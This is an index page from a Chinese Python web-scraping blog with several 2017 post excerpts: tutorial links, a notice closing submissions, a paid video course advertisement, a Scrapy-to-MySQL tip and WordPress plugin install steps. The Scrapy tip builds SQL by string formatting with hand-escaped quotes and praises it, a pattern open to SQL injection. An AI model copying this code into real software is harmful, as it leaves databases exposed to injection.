                  <p><a href="http://cuiqingcai.com/3179.html">小白爬虫第一弹之抓取妹子图</a> <a href="http://cuiqingcai.com/3256.html">小白爬虫第二弹之健壮的小爬虫</a> <a href="http://cuiqingcai.com/3314.html">小白爬虫第三弹之去重去重</a> <a href="http://cuiqingcai.com/3363.html">小白爬虫第四弹之爬虫快跑（多进程+多线程）</a> <a href="http://cuiqingcai.com/3472.html">小白进阶之 Scrapy 第一篇</a> <a href="http://cuiqingcai.com/3952.html">小白进阶之 Scrapy 第二篇（登录篇）</a> <a href="http://cuiqingcai.com/4048.html">小白进阶之</a><a href="http://cuiqingcai.com/4020.html">Scrapy 分布式的前篇—让 redis 和 MongoDB 安全点</a> <a href="http://cuiqingcai.com/4048.html">小白进阶之 Scrapy 第三篇（基于 Scrapy-Redis 的分布式以及 cookies 池）</a> <a href="http://cuiqingcai.com/4421.html">小白进阶之 Scrapy 第四篇（图片下载管道篇）</a> <a href="http://cuiqingcai.com/4725.html">小白进阶之 Scrapy 第五篇（Scrapy-Splash 配合 CrawlSpider；瞎几把整的）</a> <a href="http://cuiqingcai.com/4652.html">利用新接口抓取微信公众号的所有文章</a> <a href="https://cuiqingcai.com/6058.html">小白进阶之</a><a href="http://cuiqingcai.com/4725.html">Scrapy 第六篇</a><a href="https://cuiqingcai.com/6058.html">Scrapy-Redis 详解</a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" alt="QQ图片20161021225948"></a> 暂时就这些了、最近工作刚入职。上了个新项目，没时间更新文章了（主要是我懒、挤点时间都用来打 LOL 了···············尴尬脸） 等项目第一期结束了，我会把以前许诺的 ：JS 异步加载 | 动态爬虫 更新出来。 感谢大才哥的平台（有兴趣的小伙伴一起来更新文章啊！ 才不会告诉你们：我扯着大才哥的大旗找了个不错的工作。手动笑哭······） <strong>如果以上网站有更改无法正常采集，请 PM 我一下，我尽量保证 demo 的可用性</strong></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-04-11 20:31:03" itemprop="dateCreated datePublished" datetime="2017-04-11T20:31:03+08:00">2017-04-11</time>
                </span>
                <span id="/4352.html" class="post-meta-item leancloud_visitors" data-flag-title="小白学爬虫系列教程" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>569</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4347.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/4347.html" class="post-title-link" itemprop="url">本站投稿功能已关闭</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="公告"><a href="#公告" class="headerlink" title="公告"></a>公告</h2>
                  <p>大家好，本站于今日（2017.4.11）关闭投稿功能。</p>
                  <h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2>
                  <p>由于之前本站开放了投稿注册接口，该接口现在被人利用，每天都会发送垃圾邮件，经常导致邮箱发信过多而被冻结，而WordPress本身没有提供验证码验证，所以自己也不想再去修改，当然最主要的是能发优质文章的又是少之又少，经常会出现一些垃圾草稿，所以博主决定直接将投稿功能关闭，希望大家可以理解。</p>
                  <h2 id="投稿"><a href="#投稿" class="headerlink" title="投稿"></a>投稿</h2>
                  <p>如果您有在本站投稿意向，请直接联系我邮件cqc@cuiqingcai.com，我为您注册账号并开通写作权限。</p>
                  <h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2>
                  <p>非常感谢在本站投稿的童鞋，尤其是卧槽哥，发表了很多篇高质量爬虫文章。另外还有戴笠兄也是，不过后来戴笠兄的文章因为开车过猛而下架了哈哈，不过还是非常感谢。另外也非常感谢其他在本站投稿的小伙伴，在这不一一点名啦！</p>
                  <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>
                  <p>最后希望大家可以理解，也非常感谢大家的支持！前一段时间忙着在录制爬虫视频，今天刚刚收尾，现在已经更新完毕，后面我将学习一些数据分析、自然语言处理、Web安全方面的知识分享给大家，希望大家多多支持！感谢！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-04-11 20:03:03" itemprop="dateCreated datePublished" datetime="2017-04-11T20:03:03+08:00">2017-04-11</time>
                </span>
                <span id="/4347.html" class="post-meta-item leancloud_visitors" data-flag-title="本站投稿功能已关闭" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>440</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4320.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4320.html" class="post-title-link" itemprop="url">Python3爬虫视频学习教程</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年-Python3-网络爬虫教程"><a href="#2022-年-Python3-网络爬虫教程" class="headerlink" title="2022 年 Python3 网络爬虫教程"></a>2022 年 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术文章进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <h2 id="2018-年-Python3-网络爬虫视频课程链接"><a href="#2018-年-Python3-网络爬虫视频课程链接" class="headerlink" title="2018 年 Python3 网络爬虫视频课程链接"></a>2018 年 Python3 网络爬虫视频课程链接</h2>
                  <p>以下为 2018 年 Python3 网络爬虫视频课程</p>
                  <p><strong>天善智能：<a href="https://edu.hellobi.com/course/157" target="_blank" rel="noopener">自己动手，丰衣足食！Python3 网络爬虫实战案例</a></strong> <strong>网易云课堂：<a href="http://study.163.com/course/courseMain.htm?courseId=1003827039&amp;utm_campaign=commission&amp;utm_source=cp-1018878377&amp;utm_medium=share" target="_blank" rel="noopener">自己动手，丰衣足食！Python3 网络爬虫实战案例</a></strong></p>
                  <h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2>
                  <p>大家好哈，现在呢静觅博客已经两年多啦，可能大家过来更多看到的是爬虫方面的博文，首先非常感谢大家的支持，希望我的博文对大家有帮助！ 之前我写了一些 Python 爬虫方面的文章，<a href="http://cuiqingcai.com/1052.html">Python 爬虫学习系列教程</a>，涉及到了基础和进阶的一些内容，当时更多用到的是 Urllib 还有正则，后来又陆续增加了一些文章，在学习过程中慢慢积累慢慢成型了一套算不上教程的教程，后来有越来越多的小伙伴学习和支持我感到非常开心，再次感谢大家！ 不过其实这些教程总的来说有一些问题：</p>
                  <ol>
                    <li>当时用的 Python2 写的，刚写的时候 Scrapy 这个框架也没有支持 Python3，一些 Python3 爬虫库也不怎么成熟，所以当时选择了 Python2。但到现在，Python3 发展迅速，爬虫库也越来越成熟，而且 Python2 在不久的将来就会停止维护了，所以慢慢地，我的语言重心也慢慢转向了 Python3，我也相信 Python3 会成为主流。所以说之前的一套课程算是有点过时了，相信大家肯定还在寻找 Python3 的一些教程。</li>
                    <li>当时学习的时候主要用的 urllib，正则，所以这些文章的较大篇幅也都是 urllib 和正则的一些东西，后来的一些高级库都是在后面慢慢加的，而且一些高级的框架用法也没有做深入讲解，所以感觉整个内容有点头重脚轻，安排不合理。而且现在分布式越来越火，那么分布式爬虫的应用相必也是越来越广泛，之前的课程也没有做系统讲解。</li>
                    <li>在介绍一些操作的时候可能介绍不全面，环境的配置也没有兼顾各个平台，所以可能有些小伙伴摸不着头脑，可能卡在某一步不知道接下来是怎么做的了。</li>
                  </ol>
                  <p>那么综合上面的问题呢，最近我花了前前后后将近一个月的时间录制了一套新的 Pyhthon3 爬虫视频教程，将我之前做爬虫的一些经验重新梳理和整合，利用 Python3 编写，从环境配置、基础库讲解到案例实战、框架使用，最后再到分布式爬虫进行了比较系统的讲解。 课程内容是这个样子的：</p>
                  <h3 id="一、环境篇"><a href="#一、环境篇" class="headerlink" title="一、环境篇"></a><strong>一、环境篇</strong></h3>
                  <ul>
                    <li>Python3+Pip 环境配置</li>
                    <li>MongoDB 环境配置</li>
                    <li>Redis 环境配置</li>
                    <li>MySQL 环境配置</li>
                    <li>Python 多版本共存配置</li>
                    <li>Python 爬虫常用库的安装</li>
                  </ul>
                  <h3 id="二、基础篇"><a href="#二、基础篇" class="headerlink" title="二、基础篇"></a><strong>二、基础篇</strong></h3>
                  <ul>
                    <li>爬虫基本原理</li>
                    <li>Urllib 库基本使用</li>
                    <li>Requests 库基本使用</li>
                    <li>正则表达式基础</li>
                    <li>BeautifulSoup 详解</li>
                    <li>PyQuery 详解</li>
                    <li>Selenium 详解</li>
                  </ul>
                  <h3 id="三、实战篇"><a href="#三、实战篇" class="headerlink" title="三、实战篇"></a><strong>三、实战篇</strong></h3>
                  <ul>
                    <li>使用 Requests+正则表达式爬取猫眼电影</li>
                    <li>分析 Ajax 请求并抓取今日头条街拍美图</li>
                    <li>使用 Selenium 模拟浏览器抓取淘宝商品美食信息</li>
                    <li>使用 Redis+Flask 维护动态代理池</li>
                    <li>使用代理处理反爬抓取微信文章</li>
                    <li>使用 Redis+Flask 维护动态 Cookies 池</li>
                  </ul>
                  <h3 id="四、框架篇"><a href="#四、框架篇" class="headerlink" title="四、框架篇"></a><strong>四、框架篇</strong></h3>
                  <ul>
                    <li>PySpider 框架基本使用及抓取 TripAdvisor 实战</li>
                    <li>PySpider 架构概述及用法详解</li>
                    <li>Scrapy 框架的安装</li>
                    <li>Scrapy 框架基本使用</li>
                    <li>Scrapy 命令行详解</li>
                    <li>Scrapy 中选择器的用法</li>
                    <li>Scrapy 中 Spiders 的用法</li>
                    <li>Scrapy 中 Item Pipeline 的用法</li>
                    <li>Scrapy 中 Download Middleware 的用法</li>
                    <li>Scrapy 爬取知乎用户信息实战</li>
                    <li>Scrapy+Cookies 池抓取新浪微博</li>
                    <li>Scrapy+Tushare 爬取微博股票数据</li>
                  </ul>
                  <h3 id="五、分布式篇"><a href="#五、分布式篇" class="headerlink" title="五、分布式篇"></a><strong>五、分布式篇</strong></h3>
                  <ul>
                    <li>Scrapy 分布式原理及 Scrapy-Redis 源码解析</li>
                    <li>Scrapy 分布式架构搭建抓取知乎</li>
                    <li>Scrapy 分布式的部署详解</li>
                  </ul>
                  <p>整个课程是从小白起点的，从环境配置和基础开始讲起，环境安装部分三大平台都有介绍，实战的部分我是一边写一边讲解，还有一些分布式爬虫的搭建流程也做了介绍。 不过这个课程是收费的，其实里面也包含了我学习爬虫以来的经验和汗水，我在做讲解的时候也会把我学习爬虫的一些思路和想法讲解出来，避免大家走一些弯路，希望大家可以支持一下！ 不过在这里有免费的视频，是属于整个课程的一部分，大家可以直接观看 <strong><a href="https://edu.hellobi.com/course/156" target="_blank" rel="noopener">Python3 爬虫三大案例实战分享</a></strong> 整套视频课程放在天善智能这边了，大家如果感兴趣的话可以直接在这里购买，499 元。 课程链接如下： <strong>天善智能：<a href="https://edu.hellobi.com/course/157" target="_blank" rel="noopener">自己动手，丰衣足食！Python3 网络爬虫实战案例</a></strong> <strong>网易云课堂：<a href="http://study.163.com/course/courseMain.htm?courseId=1003827039&amp;utm_campaign=commission&amp;utm_source=cp-1018878377&amp;utm_medium=share" target="_blank" rel="noopener">自己动手，丰衣足食！Python3 网络爬虫实战案例</a></strong> <a href="https://edu.hellobi.com/course/157" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/WechatIMG257-1.jpeg" alt=""></a> 最后的最后希望大家可以多多支持！非常感谢！知识就是力量！也希望我的课程能为您创造更大的财富！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-04-11 00:38:31" itemprop="dateCreated datePublished" datetime="2017-04-11T00:38:31+08:00">2017-04-11</time>
                </span>
                <span id="/4320.html" class="post-meta-item leancloud_visitors" data-flag-title="Python3爬虫视频学习教程" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4244.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4244.html" class="post-title-link" itemprop="url">Scrapy小技巧-MySQL存储</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/吃惊表情1.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/吃惊表情1.jpg" alt="吃惊表情1"></a> 这两天上班接手，别人留下来的爬虫发现一个很好玩的 SQL 脚本拼接。 只要你的 Scrapy Field 字段名字和 数据库字段的名字 一样。那么恭喜你你就可以拷贝这段 SQL 拼接脚本。进行 MySQL 入库处理。 具体拼接代码如下：</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def process_item(self, <span class="keyword">item</span>, spider):</span><br><span class="line">    <span class="keyword">if</span> isinstance(<span class="keyword">item</span>, WhoscoredNewItem):</span><br><span class="line">        table_name = <span class="keyword">item</span>.pop(<span class="string">'table_name'</span>)</span><br><span class="line">        col_str = <span class="string">''</span></span><br><span class="line">        row_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> <span class="keyword">item</span>.<span class="built_in">keys</span>():</span><br><span class="line">            col_str = col_str + <span class="string">" "</span> + key + <span class="string">","</span></span><br><span class="line">            row_str = <span class="string">"&#123;&#125;'&#123;&#125;',"</span>.<span class="built_in">format</span>(row_str, <span class="keyword">item</span>[key] <span class="keyword">if</span> <span class="string">"'"</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="keyword">item</span>[key] <span class="keyword">else</span> <span class="keyword">item</span>[key].<span class="built_in">replace</span>(<span class="string">"'"</span>, <span class="string">"\\'"</span>))</span><br><span class="line">            sql = <span class="string">"insert INTO &#123;&#125; (&#123;&#125;) VALUES (&#123;&#125;) ON DUPLICATE KEY UPDATE "</span>.<span class="built_in">format</span>(table_name, col_str[<span class="number">1</span>:<span class="number">-1</span>], row_str[:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">for</span> (key, <span class="built_in">value</span>) <span class="keyword">in</span> <span class="literal">six</span>.iteritems(<span class="keyword">item</span>):</span><br><span class="line">            sql += <span class="string">"&#123;&#125; = '&#123;&#125;', "</span>.<span class="built_in">format</span>(key, <span class="built_in">value</span> <span class="keyword">if</span> <span class="string">"'"</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">value</span> <span class="keyword">else</span> <span class="built_in">value</span>.<span class="built_in">replace</span>(<span class="string">"'"</span>, <span class="string">"\\'"</span>))</span><br><span class="line">        sql = sql[:<span class="number">-2</span>]</span><br><span class="line">        self.cursor.execute(sql) <span class="comment">#执行SQL</span></span><br><span class="line">        self.cnx.commit()<span class="comment"># 写入操作</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个 SQL 拼接实现了，如果数据库存在相同数据则 更新，不存在则插入 的 SQL 语句 具体实现就是第一个 for 循环，获取 key 作为 MySQL 字段名字、VALUES 做为 SQL 的 VALUES（拼接成一个插入的 SQL 语句） 第二个 for 循环，实现了 字段名 = VALUES 的拼接。 和第一个 for 循环的中的 sql 就组成了 insert into XXXXX on duplicate key update 这个。存在则更新 不存在则插入的 SQL 语句。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021225948.jpg" alt="QQ图片20161021225948"></a> 我只能所 6666666666 写这个拼接的小哥儿有想法。还挺通用。 不知道你们有没有想到这种方法 反正我是没想到。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-03-19 17:05:09" itemprop="dateCreated datePublished" datetime="2017-03-19T17:05:09+08:00">2017-03-19</time>
                </span>
                <span id="/4244.html" class="post-meta-item leancloud_visitors" data-flag-title="Scrapy小技巧-MySQL存储" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>989</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4197.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> PHP <i class="label-arrow"></i>
                  </a>
                  <a href="/4197.html" class="post-title-link" itemprop="url">WordPress 远程附件上传插件 For 又拍云【升级版】</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>今天给大家介绍 WordPress Plugin for UPYUN 插件，专为<a href="https://www.upyun.com/index.html" target="_blank" rel="noopener">又拍云</a>和 WordPress 用户准备，主要功能如下：</p>
                  <ol>
                    <li>可以与 WordPress 无缝结合，通过 WordPress 上传图片和文件到又拍云, 支持大文件上传（需要开启表单 API) 和防盗链功能</li>
                    <li>支持同步删除（在 WordPress 后台媒体管理 “删除” 附件后，又拍云服务器中的文件也随之删除)</li>
                    <li>增加图片编辑功能</li>
                    <li>优化防盗链功能</li>
                    <li>增加与水印插件的兼容性，使上传到远程服务器的图片同样可以加上水印等</li>
                  </ol>
                  <p>PS：修复了很多之前版本存在的 bug，具体可访问：<a href="https://github.com/ihacklog/hacklog-remote-attachment-upyun" target="_blank" rel="noopener">github</a> 又拍云是以 CDN 为核心业务，另外提供云存储、云处理、云安全、流量营销等的云服务商，有开放且可扩展的API，以及开放的SDK和第三方插件，还针对开发者启动了 <a href="https://www.upyun.com/league.html" target="_blank" rel="noopener">又拍云联盟</a> 活动，可以每月获取免费空间和流量。更多介绍，请访问<a href="https://www.upyun.com/index.html" target="_blank" rel="noopener">又拍云</a>。 <strong>安装插件：</strong> 进入到你的 WordPress 的 wp-content/plugins 目录下</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">` # <span class="keyword">pwd</span>/home/wwwroot/blog.v5linux.<span class="keyword">com</span>/<span class="keyword">wp</span>-content/plugins`</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>克隆插件</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">` # git clone https:<span class="comment">//github.com/ihacklog/hacklog-remote-attachment-upyun.</span></span><br><span class="line">gitInitialized empty Git repository <span class="keyword">in</span> /home/wwwroot/blog.v5linux.com/wp-</span><br><span class="line">content/plugins/hacklog-remote-attachment-upyun/.git/remote: Counting </span><br><span class="line">objects: <span class="number">387</span>, done.remote: Compressing objects: <span class="number">100</span>% (<span class="number">31</span>/<span class="number">31</span>), done.</span><br><span class="line">remote: Total <span class="number">387</span> (delta <span class="number">16</span>), reused <span class="number">0</span> (delta <span class="number">0</span>), pack-reused <span class="number">356</span>Receiving </span><br><span class="line">objects: <span class="number">100</span>% (<span class="number">387</span>/<span class="number">387</span>), <span class="number">399.17</span> KiB | <span class="number">106</span> KiB/s, done.Resolving deltas:</span><br><span class="line"> <span class="number">100</span>% (<span class="number">223</span>/<span class="number">223</span>), done.`</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>设置权限</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">` # ll总用量 <span class="number">16</span>drwxr-xr-x <span class="number">4</span> www  www  <span class="number">4096</span> <span class="number">1</span>月  <span class="number">12</span> <span class="number">13</span>:<span class="number">20</span> akismetdrwxr-xr-x </span><br><span class="line"><span class="number">8</span> root root <span class="number">4096</span> <span class="number">1</span>月  <span class="number">16</span> <span class="number">11</span>:<span class="number">34</span> hacklog-remote-attachment-upyun-rw-r--r-- <span class="number">1</span> </span><br><span class="line">www  www  <span class="number">2255</span> <span class="number">5</span>月  <span class="number">23</span> <span class="number">2013</span> hello.php-rw-r--r-- <span class="number">1</span> www  www    <span class="number">28</span> <span class="number">6</span>月   </span><br><span class="line"><span class="number">5</span> <span class="number">2014</span> index.php# chown -R www:www hacklog-remote-attachment-upyun/`</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>注意，如果你是虚拟主机，请下载后打包成 zip 文件上传到 plugins 目录下插件配置 <strong>插件设置</strong></p>
                  <p><a href="https://img.wpdaxue.com/2017/03/screenshot-1.png" target="_blank" rel="noopener"><img src="https://static.oschina.net/uploads/img/201703/06153426_bm5y.png" alt=""></a> 主要配置 空间名：后台创建的存储类型服务的名称 操作员和操作员密码：后台获取 表单密钥：<a href="https://console.upyun.com/login/" target="_blank" rel="noopener">又拍云控制台</a> 找到对应的服务 — 高级选项 - 开启表单密钥远程基本 URL：填写你的绑定域名或默认域名（强烈建议使用绑定域名） REST 远程路径和 HTTP 路径：根据需求填写 插件启用和配置详情，请参考：<a href="http://support.upyun.com/hc/kb/article/1025121/" target="_blank" rel="noopener">WordPress 远程附件上传插件</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/yvette_" class="author" itemprop="url" rel="index">yvette_</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-03-12 08:46:01" itemprop="dateCreated datePublished" datetime="2017-03-12T08:46:01+08:00">2017-03-12</time>
                </span>
                <span id="/4197.html" class="post-meta-item leancloud_visitors" data-flag-title="WordPress 远程附件上传插件 For 又拍云【升级版】" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
